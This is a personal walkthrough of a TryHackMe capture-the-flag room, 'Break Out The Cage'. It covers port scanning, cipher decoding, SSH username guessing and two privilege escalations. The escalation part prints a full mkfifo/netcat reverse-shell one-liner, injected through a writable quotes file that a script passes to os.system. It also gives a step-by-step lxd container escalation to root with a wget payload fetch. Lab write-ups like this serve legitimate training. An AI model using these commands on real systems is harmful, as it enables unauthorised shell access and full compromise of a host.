---
parent: "[[CTFs - THM]]"
---
```bash
# PLATFORM          . THM
# CTF NAME          . Break Out The Cage
# DESCRIPTION       . Help Cage bring back his acting career and investigate the nefarious goings on of his agent!
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/breakoutthecage1
```

```
sudo nmap -sSVC -T5 -p- 10.10.46.222 -oN cage
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.53.46
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ddfd8894f8c8d11b51e37df81ddd823e (RSA)
|   256 3eba38632b8d1c6813d505ba7aaed93b (ECDSA)
|_  256 c0a6a364441ecf475f85f61f784c59d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Nicholas Cage Stories
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

#### PORT 21 

- Allows for anonymous login => `dad_tasks` file can be retrieved.

```
UWFwdyBFZWtjbCAtIFB2ciBSTUtQLi4uWFpXIFZXVVIuLi4gVFRJIFhFRi4uLiBMQUEgWlJHUVJPISEhIQpTZncuIEtham5tYiB4c2kgb3d1b3dnZQpGYXouIFRtbCBma2ZyIHFnc2VpayBhZyBvcWVpYngKRWxqd3guIFhpbCBicWkgYWlrbGJ5d3FlClJzZnYuIFp3ZWwgdnZtIGltZWwgc3VtZWJ0IGxxd2RzZmsKWWVqci4gVHFlbmwgVnN3IHN2bnQgInVycXNqZXRwd2JuIGVpbnlqYW11IiB3Zi4KCkl6IGdsd3cgQSB5a2Z0ZWYuLi4uIFFqaHN2Ym91dW9leGNtdndrd3dhdGZsbHh1Z2hoYmJjbXlkaXp3bGtic2lkaXVzY3ds
```

- If we `base64` decode this, we end up with another unreadable piece of text

```
Qapw Eekcl - Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!
Sfw. Kajnmb xsi owuowge
Faz. Tml fkfr qgseik ag oqeibx
Eljwx. Xil bqi aiklbywqe
Rsfv. Zwel vvm imel sumebt lqwdsfk
Yejr. Tqenl Vsw svnt "urqsjetpwbn einyjamu" wf.

Iz glww A ykftef.... Qjhsvbouuoexcmvwkwwatfllxughhbbcmydizwlkbsidiuscwl
```

- Here I tried different ROTs, Caesar Cipher and I had a feeling it might be Vigenere Cipher based on the way it looks.
- However, that would require a key. I tried some obvious ones such as `nicholas`, `cage` or `nicholascage`.

#### PORT 80

- Personal website of Nicholas Cage :) 
- Nothing much could be found here, most links aren't actually working.

- I decided a directory bruteforcing approach

```
ffuf -u http://10.10.46.222/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
```

```
contracts               [Status: 301, Size: 316, Words: 20, Lines: 10]
html                    [Status: 301, Size: 311, Words: 20, Lines: 10]
images                  [Status: 301, Size: 313, Words: 20, Lines: 10]
scripts                 [Status: 301, Size: 314, Words: 20, Lines: 10]
auditions               [Status: 301, Size: 316, Words: 20, Lines: 10]
```

- I couldn't find anything useful in the directories found above except `auditions`. Scripts is reffering to movie scripts, not programming scripts, so my hype quickly vanished.

- Auditions contains an audio file, which --- considering I might need an actual key if the above message was encrypted with vigenere --- I decided to inspect in Audacity.

- Changing the view mode to `Spectogram`, we can find an embedded image containing text in the sound waves of the mp3 file.

- That reveals itself to be the key to our vigenere cipher encrypted message.

```
Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
One. Revamp the website
Two. Put more quotes in script
Three. Buy bee pesticide
Four. Help him with acting lessons
Five. Teach Dad what "information security" is.

In case I forget.... {redacted}
```

#### PORT 22

- I had a potential password. But no username. I started gathering possible usernames from the CTF name / information on the webpage.

- I came up with the following list

```
cage
nicholas
nicholascage
cagenicholas
ncage
cagen
nicholasc
cnicholas
weston # his son's name, can be found on the webpage
westoncage
cageweston
westonc
cweston
```

- I had success with one of the usernames on this list and the password from above.

#### PRIVILEGE ESCALATION ---> CAGE

- `Weston` was able to run the following as sudo

```
User weston may run the following commands on national-treasure:
    (root) /usr/bin/bees
```

```
#!/bin/bash

wall "AHHHHHHH THEEEEE BEEEEESSSS!!!!!!!!"
```

- Which was just a bash script that we couldn't edit. 
- However, at random intervals, there were some `wall` messages containing quotes that were being sent by cage. 

- I managed to find the script running these messages in 

```
/opt/.dads_scripts
```

- using `find / -name *quotes* 2>/dev/null`

```
import os
import random

lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
quote = random.choice(lines)
os.system("wall " + quote)
```

- We did not have permissions to write to the script but we had access to write to `.files/.quotes` file.

- This is because it seems we were a member of `cage` group this whole time. 

- Anyway, I've replaced the content of `.quotes` file with the following reverse shell and waited for the script to trigger again

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.53.46 3131 >/tmp/f
```

- This allowed us to gain a reverse shell as cage.

- The first thing I did was to check the home directory ; 

- We can obtain ssh access as cage in different methods

	1. generate a ssh key pair (private + public) and add the public key to the `.ssh/authorized_keys`
	2. copy `.ssh/id_rsa` to attack box and use that to connect as cage.

- First flag is in `/home/cage/Super_Duper_Checklist` file

- Also, `/home/cage/email_backup/email_3` contains the following note that seemed to contain a password but proved useless in the end. (or there's another escalation path I didn't find :) )

```
From - Cage@nationaltreasure.com
To - Weston@nationaltreasure.com

Hey Son

Buddy, Sean left a note on his desk with some really strange writing on it. I quickly wrote
down what it said. Could you look into it please? I think it could be something to do with his
account on here. I want to know what he's hiding from me... I might need a new agent. Pretty
sure he's out to get me. The note said:

haiinspsyanileph

The guy also seems obsessed with my face lately. He came him wearing a mask of my face...
was rather odd. Imagine wearing his ugly face.... I wouldnt be able to FACE that!! 
hahahahahahahahahahahahahahahaahah get it Weston! FACE THAT!!!! hahahahahahahhaha
ahahahhahaha. Ahhh Face it... he's just odd. 

Regards

The Legend - Cage
```

#### PRIVILEGE ESCALATION ---> ROOT

- `cage` belongs to group `lxd`;

- This would allow us to compile an lxd container locally, as root, and then transfer the image to the server and use that container to mount the root of the actual filesystem, enabling us to read files from it.

- Here are the steps

**LOCAL HOST

```
git clone https://github.com/saghul/lxd-alpine-builder

cd lxd-alpine-builder

sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine

sudo ./build-alpine -a i686 
```

- Transfer the file to the target server. 

LOCAL HOST
```
python3 -m http.server
```

VICTIM
```
cd ~
wget http://ATTACKER_IP:8000/alphine_file_with_i686_in_name.tar.gz
```

**VICTIM

```
# import the image

# It's important doing this from YOUR HOME directory on the victim machine, or it might fail.
lxc image import ./alpine*.tar.gz --alias myimage 

# before running the image, start and configure the lxd storage pool as default 
# default [enter] to all of them should do the job ; rename whatever needs renamed if default already exists
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

# interact with the container
lxc start mycontainer
lxc exec mycontainer /bin/sh

cd /mnt/root
```

- The last flag is in `root/email_backup/email_2`.

